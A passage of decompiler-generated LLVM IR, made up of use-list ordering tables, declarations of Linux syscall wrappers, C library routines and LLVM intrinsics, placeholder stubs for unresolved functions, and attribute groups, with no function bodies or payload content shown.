572, 205, 206, 292, 389, 390, 246, 573, 247, 75, 574, 575, 576, 577, 578, 391, 207, 208, 293, 392, 393, 248, 249, 587, 588, 589, 590, 591, 592, 394, 294, 593, 33, 45, 76, 596, 34, 35, 241, 597, 295, 242, 243, 297, 702, 80, 703, 704, 705, 250, 79, 706, 399, 303, 304, 78, 707, 708, 709, 251, 77, 298, 710, 299, 711, 296, 400, 305, 306, 300, 301, 302, 712, 713, 714, 398, 401, 715, 716, 717, 718, 81, 82, 83, 84, 719, 720, 181, 308, 309, 252, 723, 310, 724, 253, 307, 254, 311, 725, 726, 312, 313, 760, 761, 36, 85, 86, 19, 46, 762, 37, 795, 1061, 1062, 258, 1063, 1064, 489, 10, 1011, 1012, 1013, 182, 490, 197, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072 }
  uselistorder i32* @ebx, { 36, 247, 248, 375, 376, 140, 142, 145, 146, 147, 148, 149, 143, 141, 144, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 171, 1, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 184, 182, 183, 49, 50, 377, 378, 379, 249, 2, 250, 251, 252, 3, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 380, 381, 382, 383, 185, 186, 323, 324, 469, 470, 5, 200, 189, 187, 188, 190, 195, 191, 192, 196, 197, 198, 4, 199, 201, 202, 203, 204, 205, 206, 207, 6, 208, 7, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 51, 52, 53, 54, 55, 56, 57, 58, 264, 265, 266, 267, 8, 268, 9, 269, 270, 384, 385, 386, 387, 10, 388, 389, 390, 11, 391, 12, 392, 393, 394, 395, 396, 475, 476, 13, 477, 478, 481, 482, 97, 98, 99, 100, 397, 101, 102, 483, 484, 325, 14, 326, 327, 103, 104, 485, 486, 117, 328, 73, 74, 487, 60, 488, 489, 490, 491, 492, 493, 105, 106, 59, 494, 495, 496, 497, 498, 243, 244, 329, 330, 499, 500, 501, 34, 35, 514, 515, 516, 523, 524, 525, 526, 31, 15, 29, 517, 520, 521, 522, 502, 118, 119, 120, 121, 122, 123, 124, 125, 503, 504, 505, 506, 513, 134, 135, 61, 62, 63, 64, 65, 126, 127, 16, 0, 128, 318, 319, 67, 129, 130, 131, 66, 68, 320, 321, 322, 518, 519, 69, 70, 71, 72, 331, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 17, 346, 347, 332, 333, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 18, 86, 87, 88, 89, 90, 91, 92, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 32, 359, 360, 361, 362, 363, 19, 364, 365, 366, 367, 368, 369, 370, 371, 372, 223, 224, 225, 226, 227, 228, 20, 229, 230, 231, 527, 528, 529, 530, 531, 532, 533, 536, 537, 193, 194, 398, 399, 400, 401, 402, 403, 404, 405, 406, 232, 233, 234, 235, 21, 22, 236, 237, 238, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 239, 240, 241, 242, 287, 288, 289, 290, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 441, 442, 23, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 24, 456, 457, 458, 459, 460, 461, 93, 94, 95, 96, 436, 438, 437, 439, 440, 507, 25, 508, 509, 510, 511, 33, 26, 30, 512, 538, 539, 540, 541, 542, 291, 292, 293, 294, 295, 296, 297, 27, 298, 28, 299, 300, 301, 302, 303, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 462, 463, 464, 304, 305, 308, 309, 310, 479, 480, 136, 137, 245, 246, 471, 472, 534, 535, 473, 474, 373, 374, 306, 307, 132, 133, 138, 139, 311, 312, 313, 314, 315, 316, 317, 543, 544, 545, 546, 465, 466, 467, 468 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @dup2(i32, i32) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32* @mremap(i32*, i32, i32, i32, ...) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @wait4(i32, i32, i32, %rusage*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i64 @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

declare i8 @__decompiler_undefined_function_5() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_6() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_7() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_8() local_unnamed_addr

declare %rusage* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
